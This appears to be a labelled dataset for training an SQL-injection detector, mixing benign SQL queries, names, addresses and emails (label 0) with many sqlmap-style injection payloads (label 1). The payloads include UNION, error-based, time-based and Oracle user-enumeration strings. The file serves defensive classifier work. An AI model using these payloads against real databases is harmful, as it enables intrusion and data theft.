payload	label
SELECT TOP 3 * FROM flag WHERE hand = 'powerful'	0
SELECT * FROM goose FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT * FROM most	0
"SELECT * FROM twice WHERE tropical BETWEEN ""bow"" AND    ""dress"""	0
-3044'  )   or 4999  =  3051#	1
bernette2	0
-1386'  )   or   (  7880  =  5362  )  *5362 and   (  'vsyu' like 'vsyu	1
1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'wwwb'  =  'wwwb	1
1044	0
222584000000000	0
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw"	1
toolbox	0
1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  3872  =  3872	1
1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#	1
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """	1
-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --	1
1'  )   as pudv where 2609  =  2609	1
DELETE FROM catch WHERE could = 'win'	0
6511290000000000	0
SELECT TOP 50 PERCENT * FROM military SELECT * FROM danger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM language	0
select   (  case when   (  4624  =  4844  )   then 4624 else 1/  (  select 0  )   end  )  --	1
villadoz	0
SELECT * FROM pair WHERE Price NOT BETWEEN 10 AND 20	0
SELECT AVG ( fruit ) FROM cream	0
-6512'+  (  select 'zdjx' where 5454  =  5454 order by 1--	1
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#"	1
wildt_feng-chiao@paseotuperro.ke	0
SELECT TOP 3 * FROM human WHERE could = 'pretty'	0
 SELECT column_name ( s )  FROM wherever,everyone	0
carretera cirera 186,	0
8605729999999999	0
42142	0
SELECT * FROM cutting WHERE room  BETWEEN 10 AND 20	0
1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--	1
reig jallo	0
SELECT * FROM drew WHERE food = 'nearly'  AND  ( principle = 'year' OR good = 'subject' ) 	0
"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	1
-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--	1
1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
39672063f	0
SELECT * FROM all WHERE solution = 'press' LIMIT 3	0
16813	0
1'  )   as eymt where 3911  =  3911 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
DELETE FROM greatest	0
SELECT fight ( s )  FROM new SELECT everybody ( s ) 	0
SELECT liquid FROM battle UNION ALL SELECT football FROM becoming ORDER BY thumb	0
26527823z	0
-6081 where 3681  =  3681 or 2603  =  3138--	1
FROM  ( SELECT DISTINCT building FROM win ) 	0
-9861' union all select 5710,5710,5710,5710,5710--	1
1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg	1
SELECT * FROM recently 3 SELECT * FROM excellent	0
1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'qbdm'  =  'qbdm	1
1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
   SELECT sent, which+ ', ' + useful+ ' ' + section+ ', ' + spread AS region  FROM cattle	0
"1%""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""frgb"" like ""frgb"	1
1'+  (  select inrv where 2178  =  2178 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
33s4h9929r	0
SELECT TOP 50 PERCENT * FROM terrible SELECT * FROM film FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM view	0
"1"" or sleep  (  5  )   and ""telb""  =  ""telb"	1
estasio	0
" end and   (  ""vwbx""  =  ""vwbx"	1
; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --	1
SELECT * FROM hungry	0
quintina	0
recerdo	0
1' where 2958  =  2958	1
"-7744""   )    )     )   union all select 9408,9408,9408,9408--"	1
suto8i+a	0
calle juan sebastian elcano, 157 11?b	0
SELECT * FROM sound WHERE after NOT LIKE 'alive%'	0
1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
"  SELECT TIME_FORMAT ( ""19:30:10"", ""%H %i %s"" ) ;"	0
1'   )    )    as kwre where 7775  =  7775 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  	1
"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #"	1
SELECT * FROM public FETCH FIRST 50 PERCENT ROWS ONLY	0
admin' or '	1
"-2987""  )   as iyob where 7827  =  7827 or   (  8459  =  8459  )  *4906--"	1
SELECT AVG ( simply ) FROM order SELECT SUM ( piece ) 	0
SELECT * FROM six WHERE NOT community = 'famous'  AND NOT luck = 'engine'	0
"-3228""  )   or   (  5901  =  1570  )  *1570 and   (  ""egdd""  =  ""egdd"	1
1290000000000000	0
pillo	0
22373	0
   SELECT rear, hurry, whereFROM surprise WHERE as  IS NOT NULL	0
SELECT TOP 50 PERCENT * FROM finger	0
8n66ies4a	0
pladeval berganciano	0
graciano	0
 or uid like '%	1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""layz""  =  ""layz"	1
select   (  case when   (  9343  =  9513  )   then 1 else 9343*  (  select 9343 from master..sysdatabases  )   end  )  --	1
1%'  ) 	1
SELECT * FROM growth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM managed	0
-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--	1
suen	0
"SELECT * FROM low WHERE money BETWEEN ""effort"" AND    ""favorite"""	0
"1""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
SELECT * FROM perfect	0
SELECT TOP 3 * FROM particular WHERE rise = 'treated'	0
SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'property_status' )  ORDER BY t.name ASC	0
"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy"	1
SELECT CustomerName, /*City,*/ Country FROM Customers;	0
1'  )   as rhvm where 1420  =  1420	1
8730000000000000	0
SELECT * FROM  ( SELECT numeral FROM experiment ) 	0
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- jdia	1
1'  )   as lgex where 4068  =  4068 and 1378  =  9247--	1
urbanitzacio europa-fuentes de san bernabe s/n,	0
6o40o41	0
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt"	1
"1%""   )    )    union all select null,null,null,null,null,null,null#"	1
1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --	1
calle eduard toldra 137 5?a	0
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc"	1
SELECT try FROM ball UNION ALL SELECT anyway FROM stock ORDER BY yourself	0
-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx	1
SELECT * FROM  ( SELECT milk FROM opinion ) 	0
zurueta olarte	0
1'||  (  select 'ymwf' where 1229  =  1229 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'	1
"1""  )   where 5491  =  5491"	1
SELECT * FROM strip	0
pelle1@906.com.aq	0
  SELECT especially,pile FROM poor WHERE fact = 'sand' UNION SELECT up, activity FROM gentle	0
   SELECT Employees.was, COUNT ( Orders.streetID )  AS schoolFROM    ( OrdersINNER JOIN jar ON Orders.cookiesID  =  Employees.helloID ) 	0
oretana	0
54011879j	0
"1""  )   where 7914  =  7914 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #"	1
select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --	1
sazarina_logue@gay-tantra.lc	0
SELECT AVG ( front ) FROM gather SELECT SUM ( directly ) 	0
SELECT * FROM forward WHERE nation NOT BETWEEN 'tree' AND 'sudden'	0
1%' union all select null,null#	1
1' where 8482  =  8482 or sleep  (  5  )  #	1
SELECT AVG ( Price ) FROM hand	0
1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #	1
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --"	1
salter@quiromante.com.mg	0
1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT AVG ( thee ) FROM language SELECT SUM ( friend ) 	0
SELECT AVG ( Price ) FROM western	0
-9156'   )    )    union all select 9110,9110,9110,9110#	1
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) 	1
SELECT COUNT ( DISTINCT composed )  FROM becoming	0
"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --"	1
1   )    ) 	1
-4583'  )   as evbo where 6055  =  6055 union all select 6055--	1
SELECT * FROM back FETCH FIRST 50 PERCENT ROWS ONLY	0
lucio	0
"1""  )   union all select null,null#"	1
SELECT * FROM practical  WHERE front NOT LIKE '[exact]%'	0
resaca	0
SELECT * FROM mouth WHERE    NOT current = 'hall'	0
SELECT TOP 3 * FROM load WHERE several = 'film'	0
SELECT * FROM someone FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT * FROM welcome	0
-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri	1
51975226x	0
-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--	1
 (  select   (  case when   (  6035  =  9882  )   then 6035 else 6035*  (  select 6035 from mysql.db  )   end   )    ) 	1
 select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'	1
SELECT spider ( s )  FROM settlers UNION	0
1'||  (  select 'ussi' where 8958  =  8958	1
"-6333""   )    )     )   union all select 9851,9851,9851,9851,9851,9851--"	1
1008	0
1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
c/ observatorio meteorologico retiro 70, 3?a	0
nogueira de ramun	0
-3566%' or 2158  =  6289	1
SELECT AVG ( owner ) FROM discover SELECT SUM ( here ) 	0
SELECT * FROM machine  WHERE death NOT LIKE '[tool]%'	0
SELECT * FROM attention WHERE task  BETWEEN 10 AND 20	0
1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1"	1
SELECT daily ( s )  FROM exactly SELECT color FROM strong	0
1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
  SELECT * FROM certainly WHERE own NOT IN  ( 'your', 'idea', 'pocket' )  	0
walberg@ytv.com.gn	0
SELECT * FROM than WHERE modern = 'favorite' FETCH FIRST 3 ROWS ONLY	0
SELECT hang	0
1  )   as tgqd where 6369  =  6369 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
ten.tar	0
   SELECT COUNT ( guess ) , shall FROM measure BY tobacco	0
"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq"	1
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --	1
SELECT * FROM discover WHERE high = 'grandmother'  OR island = 'under'	0
SELECT MIN ( variety )  AS walk FROM eat	0
0a0t4d2r	0
SELECT prevent ( s )  FROM saw	0
1' where 8083  =  8083 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --	1
-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--	1
1   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4277  =  4277	1
SELECT COUNT ( bone )  FROM power	0
bauer	0
1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  	1
select count  (  *  )   from generate_series  (  1,5000000  )   and   (  '%'  =  '	1
if  (  3490  =  4920  )   select 3490 else drop function hlzt--	1
SELECT box ( s ) FROM poor INNER JOIN	0
"1""  )   where 9093  =  9093"	1
waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta	1
DELETE FROM prize	0
-3775'  )   as rqet where 7092  =  7092 or elt  (  1032  =  1032,3623  )  --	1
SELECT AVG ( found ) FROM ready	0
SELECT * FROM salmon  WHERE principal NOT LIKE '[his]%'	0
SELECT * FROM wooden WHERE grandmother NOT LIKE 'tonight%'	0
   SELECT small, church, memberFROM naturally WHERE up  IS NOT NULL	0
5385470000000000	0
SELECT TOP 3 * FROM aware WHERE after = 'doing'	0
"-2013""   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --"	1
 select * from users where id  =  '1' union select @ 1,version  (    )   --  1'	1
SELECT * FROM lunch WHERE discovery = 'uncle'	0
SELECT COUNT ( DISTINCT visit )  FROM growth	0
-9847%'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  '	1
1  )   as svkf where 6503  =  6503 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 	1
SELECT AVG ( noted ) FROM key	0
9.32767E+015	0
-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#	1
SELECT AVG ( Price ) FROM broke	0
despacio	0
  UPDATE personal SET tomorrow =  'whose', City =  'partly' WHERE cloud =  fun	0
SELECT * FROM flame WHERE men BETWEEN since09/01/1996minute AND teeth15/31/1996rocky	0
mbrose	0
SELECT TOP 3 * FROM own WHERE individual = 'worse' SELECT * FROM from	0
"-2032%""   )    )     )   or   (  3082  =  7155  )  *7155 and    (    (     (  ""%""  =  """	1
budd9	0
 UPDATE tune SET alphabet = 'fought'WHERE spent = 'seed'	0
SELECT MIN ( bound )  AS slope FROM date	0
-3862'  )   or 9323  =  9323#	1
"-7313""  )   where 3606  =  3606 union all select 3606#"	1
contrariosa	0
alcal de la vega	0
SELECT * FROM  ( SELECT hand FROM wore ) 	0
1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq	1
liesemer	0
SELECT * FROM nose WHERE zero = 'slope'  AND City = 'muscle'	0
   SELECT can, instead, term FROM official WHERE map  IS NULL	0
1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd	1
villalpando iturbide	0
SELECT * FROM equally WHERE larger = 'has'  AND City = 'broke'	0
magrath	0
 SELECT column_name ( s )  FROM happened,getting	0
 SELECT * FROM strong ORDER BY said ASC, yard DESC	0
1 where 5859  =  5859 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3	1
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_settings' LIMIT 1	0
SELECT TOP 3 * FROM send WHERE birth = 'hollow' SELECT * FROM liquid	0
  SELECT * FROM here WHERE seven NOT IN  ( 'mine', 'origin', 'future' )  	0
SELECT TOP 50 PERCENT * FROM wear SELECT * FROM parent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM difficult	0
SELECT TOP 3 * FROM ask WHERE body = 'clearly' SELECT * FROM donkey	0
selles tanari	0
SELECT * FROM public WHERE hung = 'return'  OR had = 'oldest'	0
SELECT * FROM private	0
SELECT * FROM consider WHERE    NOT recently = 'seen'	0
SELECT TOP 3 * FROM sent SELECT * FROM evening 3SELECT * FROM cloud	0
1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )   	1
SELECT * FROM star WHERE NOT own = 'structure'  AND NOT now = 'fair'	0
385057000000000	0
hornos	0
SELECT * FROM differ WHERE blanket = 'bet'	0
" end and ""xouo"" like ""xouo"	1
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 416 )  ORDER BY meta_id ASC	0
1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'ebuo'  =  'ebuo	1
lugar higuera canaria, 169	0
"1%"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """	1
.bronceada	0
SELECT * FROM pretty	0
SELECT COUNT ( union ) FROM these	0
llasera	0
1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   	1
42808198t	0
93777834a	0
SELECT * FROM everyone WHERE pond IN  ( SELECT either FROM average ) 	0
1%'  )   and   (  7704  =  3494  )  *3494 and   (  '%'  =  '	1
mckearne	0
7367770000000000	0
FROM  ( SELECT DISTINCT tool FROM try ) 	0
SELECT * FROM courage WHERE method = 'tobacco'  AND  ( wonderful = 'tool' OR best = 'laid' ) 	0
sorts bransuel	0
piero	0
1'   )    )    union all select null,null,null,null,null,null,null,null,null,null#	1
SELECT MIN ( pig )  AS pack FROM soil	0
1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '	1
cabrera, 199	0
1   )    )    as midl where 9046  =  9046 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --	1
SELECT minute ( s )  FROM activity SELECT straw FROM collect	0
SELECT COUNT ( bee ) FROM palace	0
rutledge	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i	1
SELECT COUNT ( nature ) FROM late	0
"1""  )   where 4739  =  4739 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --"	1
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #	1
SELECT * FROM doll FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM  ( SELECT station FROM flew ) 	0
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""bnyh""  =  ""bnyh"	1
torrande gaitan	0
1',  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  	1
2910120000000000	0
or 1  =  1--	1
pecelln	0
-9929'  )   as gbtc where 8162  =  8162 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #	1
  SELECT negative,but,seldom FROM social LEFT JOIN Orders ON forward.mainlyID =  continent.myself ORDER BY business.temperature	0
"1"" where 1203  =  1203 union all select null,null,null--"	1
 SELECT column_name ( s )  FROM plain,amount	0
c/ meneses, 104 6-a	0
1 or sleep  (  __TIME__  )  #	1
1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '	1
1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
pearce	0
1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--	1
"-5972"" or 8509  =  3448#"	1
SELECT hit ( s )  FROM smile FULL OUTER JOIN	0
vladamir	0
lanae	0
cuarter8da	0
"  SELECT GREATEST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;"	0
1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
iif  (  4638  =  8258,1,1/0  )  	1
48042322z	0
16118	0
6343510000000000	0
-2402 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- szgq	1
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste	0
INSERT INTO quarter  ( plan, taken, country )  VALUES  ( 'tiny', 'needed', 'clock' )  	0
SELECT * FROM represent WHERE exactly NOT LIKE 'toy%'	0
SELECT TOP 3 * FROM swing WHERE crew = 'feed'	0
SELECT * FROM steam WHERE using = 'fellow' LIMIT 3	0
1'  )   and elt  (  7554  =  6257,6257  )   and   (  'bpzm'  =  'bpzm	1
"SELECT * FROM band WHERE sad BETWEEN ""cover"" AND    ""without"""	0
   SELECT broad, blank+ ', ' + alike+ ' ' + managed+ ', ' + smallest AS dangerous  FROM meet	0
"-8454"" or 6872  =  6872"	1
-2086%'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  '%'  =  '	1
SELECT * FROM below WHERE fill NOT LIKE 'situation%'	0
calle valdibaez 185,	0
1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --	1
1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx	1
28614822q	0
1  )   as nioj where 9703  =  9703	1
  SELECT * FROM twice WHERE lost NOT IN  ( 'bit', 'typical', 'darkness' )  	0
SELECT COUNT ( beginningID ) FROM were	0
margheri	0
pilapil@espaciopintor.my	0
59718568b	0
arima@hormigon-impreso.nu	0
1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --	1
1  )   as qwsa where 2874  =  2874	1
1   )    )    as hpxw where 1826  =  1826 union all select null,null,null,null,null,null,null,null#	1
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ) 	0
